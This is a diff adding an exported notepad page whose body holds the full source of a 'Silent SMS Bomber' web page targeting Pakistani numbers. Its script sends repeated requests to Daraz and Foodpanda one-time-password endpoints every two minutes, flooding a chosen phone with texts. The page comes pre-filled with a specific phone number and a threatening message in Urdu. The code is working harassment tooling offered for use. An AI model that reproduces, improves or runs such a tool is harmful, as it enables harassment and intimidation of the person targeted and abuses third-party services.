@@ -1,0 +1,34 @@
+Mime-Version: 1.0
+Content-Base: https://notepad-online.com/v2/en
+Content-Type: Multipart/related; boundary="NEXT.ITEM-BOUNDARY";type="text/html"
+
+--NEXT.ITEM-BOUNDARY
+Content-Type: text/html; charset="utf-8"
+Content-Location: https://notepad-online.com/v2/en
+
+<!DOCTYPE html>
+<html xmlns:o="urn:schemas-microsoft-com:office:office" 
+xmlns:w="urn:schemas-microsoft-com:office:word" 
+xmlns="http://www.w3.org/TR/REC-html40">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:View>Print</w:View>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:ValidateAgainstSchemas/>
+  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
+  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
+  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+ </w:WordDocument>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:LatentStyles DefLockedState="false" LatentStyleCount="156">
+ </w:LatentStyles>
+</xml><![endif]-->
+<style>
+
+</style>
+</head>
+<body><div style="font-family:Arial,Calibri,sans-serif;font-size:16pt;"><h1>Page 1</h1><p>&lt;!-- sms_bomber_pk.html -→</p><p>&lt;!DOCTYPE html&gt;</p><p>&lt;html&gt;</p><p>&lt;head&gt;</p><p>&nbsp; &lt;title&gt;Pak SMS Bomber&lt;/title&gt;</p><p>&nbsp; &lt;script src="https://code.jquery.com/jquery-3.6.0.min.js"&gt;&lt;/script&gt;</p><p>&lt;/head&gt;</p><p>&lt;body&gt;</p><p>&nbsp; &lt;h1&gt;🇵🇰 Silent SMS Bomber (Pakistan)&lt;/h1&gt;</p><p>&nbsp; &lt;input type="text" id="number" placeholder="Enter Number (03XX)" value="03451278831" /&gt;</p><p>&nbsp; &lt;input type="text" id="msg" placeholder="Your Message" value="CCTV on karo, tera kand dekh raha hoon!" /&gt;</p><p>&nbsp; &lt;button onclick="startAttack()"&gt;Start Bombing&lt;/button&gt;</p><p>&nbsp; &lt;p id="status"&gt;Ready...&lt;/p&gt;</p><p>&nbsp; &lt;script&gt;</p><p>&nbsp; &nbsp; function sendSms() {</p><p>&nbsp; &nbsp; &nbsp; const num = $('#number').val().replace(/^0/, '92');</p><p>&nbsp; &nbsp; &nbsp; const msg = encodeURIComponent($('#msg').val());</p><p>&nbsp; &nbsp; &nbsp; // Daraz</p><p>&nbsp; &nbsp; &nbsp; $.post('https://m.daraz.pk/poy/customer/account/createSendSms', {phoneNumber: num});</p><p>&nbsp; &nbsp; &nbsp; // Foodpanda PK</p><p>&nbsp; &nbsp; &nbsp; $.post('https://foodpanda.pk/customers/otp/send', {</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 'customer[phone_number]': num,</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 'customer[country_iso_code]': ‘PK’</p><p>&nbsp; &nbsp; &nbsp; });</p><p>&nbsp; &nbsp; &nbsp; $('#status').text('🔥 Bombing... Last hit: ' + new Date().toLocaleTimeString());</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &nbsp; function startAttack() {</p><p>&nbsp; &nbsp; &nbsp; setInterval(sendSms, 120000); // Har 2 minute baad</p><p>&nbsp; &nbsp; &nbsp; sendSms();</p><p>&nbsp; &nbsp; }</p><p>&nbsp; &lt;/script&gt;</p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p></div></body></html>
+--NEXT.ITEM-BOUNDARY--
